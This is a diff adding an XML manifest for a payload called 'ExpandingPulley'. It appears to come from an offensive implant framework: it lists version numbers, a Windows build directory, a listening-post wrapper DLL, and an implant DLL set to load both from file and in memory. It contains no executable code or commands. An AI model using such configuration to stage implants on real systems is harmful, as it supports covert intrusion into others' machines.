@@ -1,0 +1,24 @@
+<?xml version='1.0' ?>
+
+<Payload name="ExpandingPulley">
+
+	<PC>
+		<Version major='2' minor='0'/>
+		<Version major='2' minor='1'/>
+		<Version major='2' minor='2'/>
+		<Version major='2' minor='3'/>
+	</PC>
+
+	<LogDir>EP</LogDir>
+	<Type>PayloadLibrary_NotCP</Type>
+	<Export>#1</Export>
+	<Parameters>Default</Parameters>
+
+	<OsVersion major='*' minor='*' revision='*'>
+		<Directory>Ep/Payloads/Files/i386-winnt-vc9s/release</Directory>
+		<Lp>PC_EpWrapperLp.dll</Lp>
+		<Implant type="file">../../../../Bootstrap/DSZ_EP_Implant.dll</Implant>
+		<Implant type="memory">../../../../Bootstrap/DSZ_EP_Implant.dll</Implant>
+	</OsVersion>
+
+</Payload>
